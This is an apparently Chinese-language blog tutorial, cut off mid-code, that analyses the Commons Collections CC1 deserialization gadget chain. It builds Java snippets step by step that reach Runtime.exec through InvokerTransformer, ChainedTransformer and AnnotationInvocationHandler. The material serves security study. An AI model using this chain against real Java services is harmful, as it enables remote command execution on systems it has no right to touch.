        <content type="html"><![CDATA[<h1 id="初试CommonsCollections"><a href="#初试CommonsCollections" class="headerlink" title="初试CommonsCollections"></a>初试CommonsCollections</h1><p>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p><p>Commons Collections简单说就是一个集合类，它方便了对map等数据结构的操作。</p><p>Commons Collections是java应用非常常用的一个依赖因此能够很好的作为漏洞利用点，Commons Collections链的多个不同在于间接调用的流程。</p><h2 id="InvokerTransformer-transform隐藏后门？"><a href="#InvokerTransformer-transform隐藏后门？" class="headerlink" title="InvokerTransformer.transform隐藏后门？"></a>InvokerTransformer.transform隐藏后门？</h2><p>Commons Collections反序列化的漏洞利用点就在于Transformer的实现类InvokerTransformer类的transform方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6-8行代码清晰可见，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass(); <span class="comment">// 获取传入类input原型</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes); <span class="comment">// 获取类方法。</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, iArgs); <span class="comment">// 反射调用</span></span><br></pre></td></tr></table></figure><p>很清晰的反射调用任意方法。iMethodName, iParamTypes，iArgs这三个参数是InvokerTransformer类的成员变量，因此会在构造函数中赋予初值。InvokerTransformer有两个构造函数，第一个用于调用无参的方法，第二个如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据InvokerTransformer我们就可以通过InvokerTransformer编写命令执行代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201937460.png" alt="img"></p><p>而且InvokerTransformer类也实现了Serializable接口，这就是一个很好的反序列化的危险代码点。</p><p>接下来我们就需要找：<strong>能够间接调用InvokerTransformer类的transform(Object input)方法，且input可控。</strong></p><p>对于一个完整反序列化攻击的流程：入口类（重写readObject）-&gt;间接调用-&gt;可控的危险代码。当然如果某个类的readObject方法直接调用了这个危险的方法那这是最好的结果（一般不会，除非写着玩）。因此就需要找间接调用。</p><h2 id="间接调用"><a href="#间接调用" class="headerlink" title="间接调用"></a>间接调用</h2><p>何为间接调用？字面意思：A方法调用了B方法，B方法无法直接调用，那么我们通过调用A方法就可以调用B方法。这是最简单也是最理想的情况，但是A方法中调用B方法的时候可能存在一些条件，比如if(..){B}，那我们只有满足if的条件才能够去调用B方法。</p><p>反序列化漏洞的利用链往往比上述的更为复杂，因为几乎框架代码不会那样写，有时候框架往往为了其灵活性都不是固定的方法调用。这一点往往使得一条利用链比较难以分析（小白）。举一个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> <span class="keyword">implements</span> <span class="title class_">testimpl</span>,Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test1</span><span class="params">(String cmd)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">impl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test2</span> <span class="keyword">implements</span> <span class="title class_">testimpl</span>,Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> testimpl object;</span><br><span class="line">    <span class="keyword">private</span> String flag;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test2</span><span class="params">(testimpl o,String f)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.object = o;</span><br><span class="line">        <span class="built_in">this</span>.flag = f;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.flag.equals(<span class="string">&quot;A&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">this</span>.object.impl();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">impl</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到test1中有危险方法Runtime.getRuntime.exec();并且参数可直接控制，如果这test1和test2这两段代码放到服务器上，且存在一个接口用于接受序列化数据并对其反序列化。那么就能够通过序列化test2来实现间接调用test1。</p><p>分析思路：</p><p>test1中存在impl方法且可以任意命令执行，下边就看那个地方调用了impl。很显然test2的readObject方法调用了impl方法，并且这个对象我们可以控制（在test2构造函数中）。那么我们就可以很容易的构造出反序列化链来：<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201938242.png" alt="img"></p><p>当然CC链而非这么简单，差别无非需要在寻找impl方法调用的地方需要在找几层，最后还是需要在某一类的readObject方法中间接调用了impl。掌握这一思路，分析过程简化了！</p><h1 id="CC1利用链"><a href="#CC1利用链" class="headerlink" title="CC1利用链"></a>CC1利用链</h1><p>上述分析：我们需要找一个<strong>能够间接调用InvokerTransformer类的transform(Object)方法，且Object可控。</strong>如果这个方法正好是某一个类的readObject方法那就万事大吉，如果不是则需要进一步找间接调用（套娃）。</p><p>可以发现：TransformedMap中的checkSetValue方法调用了transform方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>valueTransformer可通过TransformedMap的构造函数控制（赋值成InvokerTransformer就等价于调用InvokerTransformer.transform）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>value值可控。（等价于transform的Object值可控）。</p><p>​但是TransformedMap不是公有类，得通过调用静态方法decorate进行初始化，不过参数值仍然可控。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​走到这里我们就可以利用TransformedMap的decorate方法进一步封装TransformedMap中的checkSetValue这一个危险方法。</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201941523.png" alt="img"></p><p>但是不行，因为checkSetValue它是一个protected的方法。那我们就继续找：<strong>能够间接调用TransformedMap.checkSetValue(Object)，且Object可控。</strong></p><p>只有一处AbstractInputCheckedMapDecorator抽象类中的静态类MapEntry中的setValue方法。它是一个公有的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The parent map */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(entry);</span><br><span class="line">        <span class="built_in">this</span>.parent = parent;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        value = parent.checkSetValue(value);</span><br><span class="line">        <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>setValue的Object参数可控，</p><p>parent可通过初始化赋值，可控，可修改成TransformedMap。</p><p>等价于调用了TransformedMap.checkSetValue(Object)。</p><p>这里就出现一个问题：如何调用呢？仔细观察可发现：</p><p>TransformedMap类继承了AbstractInputCheckedMapDecorator，AbstractInputCheckedMapDecorator类继承了AbstractMapDecorator类，AbstractMapDecorator实现了Map接口，AbstractInputCheckedMapDecorator对Map的setValue方法进行了重写，TransformedMap调用setValue等价于调用AbstractInputCheckedMapDecorator的setValue。AbstractInputCheckedMapDecorator的setValue中调用了TransformedMap.checkSetValue(Object)。</p><p>那么我们就可以通过MapEntry中的setValue方法进一步包装直接危险方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">    map.put(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry entry:decorate.entrySet())&#123;</span><br><span class="line">        entry.setValue(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201942263.png" alt="img"></p><p>证明可行！</p><p>接下来找一下：<strong>能够间接调用MapEntry.setValue(Object)，且Object可控。</strong></p><p>找的时候我们优先找readObject方法，因为这是我们的终点。</p><p>AnnotationInvocationHandler这个类的readObject调用了setValue方法，那么这就算是找到了一条可能可行的利用链。</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201943042.png" alt="img"></p><p>这时候我们就可以找到这条Gadget chain（简写）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    MapEntry.setValue()</span><br><span class="line">      TransformedMap.checkSetValue()</span><br><span class="line">        InvokerTransformer.transform()</span><br><span class="line">        class.getMethod()</span><br><span class="line">          Method.invoke()</span><br></pre></td></tr></table></figure><p>1、链上的每一个利用类是否可以序列化？</p><p>目前看似是可以的，但是如果我们实现任意命令执行的攻击流程就会使用Runtime这个类，这个类没有实现Serialize接口是没有办法序列化。那怎么办呢？</p><p>Class类是可以序列化的，那么我们是否可以利用Class类来包裹我们的Runtime类呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>修改成InvokerTransformer反射：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">clsM</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="comment">/* 等价于</span></span><br><span class="line"><span class="comment">Runtime.class.getMethod(&quot;getMethod&quot;,class).invoke()</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(clsM);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line"><span class="comment">// 等价于</span></span><br></pre></td></tr></table></figure><p>这里可以发现规律是：后一个的InvokerTransformer.transform的参数是前一个的结果，Transformer有一个实现类ChainedTransformer的transform方法可以直接完成。就相当于调用一次chainedTransformer.transform方法相当于调用了多次InvokerTransformer的transform。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformedMaps = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformedMaps);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>2、链上的每个方法均可顺理执行？</p><p>分析AnnotationInvocationHandler.readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">    <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                        annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>annotationType &#x3D; AnnotationType.getInstance(type);</p><p>type为AnnotationInvocationHandler构造函数的第一个参数是注解类型。此方法获取type。</p><p>Map&lt;String, Class&lt;?&gt;&gt; memberTypes &#x3D; annotationType.memberTypes();</p><p>AnnotationType.memberTypes获取type的成员方法。</p><p>String name &#x3D; memberValue.getKey();</p><p>获取传入map的键。</p><p>​       Class&lt;?&gt; memberType &#x3D; memberTypes.get(name);</p><p>在type的成员方法中查找map的键。</p><p>因此进入第一个if条件就是找一个注解类型的类，其成员方法名在map中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class, TransformerMap);</span><br></pre></td></tr></table></figure><p>第二个if条件是map的值和type注解是否可以强转，默认即可通过。</p><p>3、整条链上的参数全部可控？</p><p>前边分析的参数都是可以控制的，只需要看AnnotationInvocationHandler类的readObject方法和setValue方法就行了。</p><p>调用setValue的memberValue是否可控？答案是可以的，readObject方法中memberValue来自memberValues遍历，memberValues是AnnotationInvocationHandler的成员变量，在构造函数中赋予了初值。setValue中的参数是否可控？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).</span><br><span class="line">    setMember(annotationType.members().get(name))</span><br></pre></td></tr></table></figure><p>调试：<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/java%E5%88%A9%E7%94%A8%E9%93%BECC%E9%93%BE/202303201944489.png" alt="img"></p><p>此时已经到了我们想要的setValue方法处，而且parent&#x3D;TransformedMap，但是value&#x3D;AnnotationTypeMismatchExceptionProxy并不是我们想要的。</p><p>这里可用一个ConstantTransformer类来解决，它可以包裹任意对象，因为它的transform方法无论传入和值返回的是一个在构造方法中固定好的类。</p><p>OK分析到这里就可以尝试编写POC了。</p><p>因为AnnotationInvocationHandler不是共有类，因此无法直接new，只能通过反射实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, 